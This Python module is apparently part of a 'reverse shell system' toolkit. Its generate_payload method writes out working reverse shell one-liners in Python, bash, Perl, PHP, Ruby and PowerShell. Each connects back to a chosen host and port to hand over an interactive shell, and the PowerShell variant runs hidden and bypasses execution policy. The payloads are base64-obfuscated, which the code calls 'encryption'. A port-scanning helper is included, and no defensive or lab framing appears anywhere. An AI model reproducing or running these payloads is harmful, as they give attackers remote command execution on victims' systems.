"""
Utility functions for the reverse shell system.
"""

import socket
import random
import string
import hashlib
import base64
from typing import Optional, Tuple, List
from cryptography.fernet import Fernet
from .config import CONFIG

class ShellUtils:
    """Utility class for shell operations"""
    
    @staticmethod
    def generate_random_string(length: int = 16) -> str:
        """Generate a random string of specified length"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    @staticmethod
    def encrypt_data(data: str, key: Optional[bytes] = None) -> Tuple[bytes, bytes]:
        """
        Encrypt data using Fernet
        Returns tuple of (encrypted_data, key)
        """
        if key is None:
            key = Fernet.generate_key()
        f = Fernet(key)
        return f.encrypt(data.encode()), key
    
    @staticmethod
    def decrypt_data(encrypted_data: bytes, key: bytes) -> str:
        """Decrypt data using Fernet"""
        f = Fernet(key)
        return f.decrypt(encrypted_data).decode()
    
    @staticmethod
    def validate_ip(ip: str) -> bool:
        """Validate IP address format"""
        try:
            socket.inet_aton(ip)
            return True
        except socket.error:
            return False
    
    @staticmethod
    def validate_port(port: int) -> bool:
        """Validate port number"""
        return (
            0 < port < 65536 and
            port not in CONFIG['network']['banned_ports']
        )
    
    @staticmethod
    def hash_data(data: str, algorithm: str = CONFIG['security']['hash_algorithm']) -> str:
        """Hash data using specified algorithm"""
        h = hashlib.new(algorithm)
        h.update(data.encode())
        return h.hexdigest()
    
    @staticmethod
    def encode_base64(data: str) -> str:
        """Encode data in base64"""
        return base64.b64encode(data.encode()).decode()
    
    @staticmethod
    def decode_base64(data: str) -> str:
        """Decode base64 data"""
        return base64.b64decode(data.encode()).decode()
    
    @classmethod
    def generate_payload(cls, shell_type: str, host: str, port: int, encryption: bool = True) -> str:
        """Generate payload for specified shell type"""
        payload_templates = {
            'python': (
                f'import socket,subprocess,os;'
                f's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
                f's.connect(("{host}",{port}));'
                f'os.dup2(s.fileno(),0);'
                f'os.dup2(s.fileno(),1);'
                f'os.dup2(s.fileno(),2);'
                f'subprocess.call(["/bin/sh","-i"])'
            ),
            'bash': f'bash -i >& /dev/tcp/{host}/{port} 0>&1',
            'perl': (
                f'perl -e \'use Socket;$i="{host}";$p={port};'
                f'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
                f'if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");'
                f'open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}}\''
            ),
            'php': (
                f'php -r \'$sock=fsockopen("{host}",{port});'
                f'exec("/bin/sh -i <&3 >&3 2>&3");\''
            ),
            'ruby': (
                f'ruby -rsocket -e\''
                f'exit if fork;c=TCPSocket.new("{host}","{port}");'
                f'while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end\''
            ),
            'powershell': (
                f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object '
                f'System.Net.Sockets.TCPClient("{host}",{port});'
                f'$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};'
                f'while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)'
                f'{{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);'
                f'$sendback = (iex $data 2>&1 | Out-String );'
                f'$sendback2 = $sendback + "PS " + (pwd).Path + "> ";'
                f'$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);'
                f'$stream.Write($sendbyte,0,$sendbyte.Length);'
                f'$stream.Flush()}};$client.Close()'
            )
        }
        
        payload = payload_templates.get(shell_type.lower())
        if payload is None:
            raise ValueError(f"Unsupported shell type: {shell_type}")
        
        if encryption:
            payload = cls.encode_base64(payload)
            
        return payload
    
    @staticmethod
    def check_port_availability(host: str, port: int) -> bool:
        """Check if port is available on host"""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                result = s.connect_ex((host, port))
                return result != 0
        except socket.error:
            return False
    
    @staticmethod
    def find_available_port(host: str, start_port: int = 1024, end_port: int = 65535) -> Optional[int]:
        """Find first available port in range"""
        for port in range(start_port, end_port + 1):
            if (
                port not in CONFIG['network']['banned_ports'] and
                ShellUtils.check_port_availability(host, port)
            ):
                return port
        return None 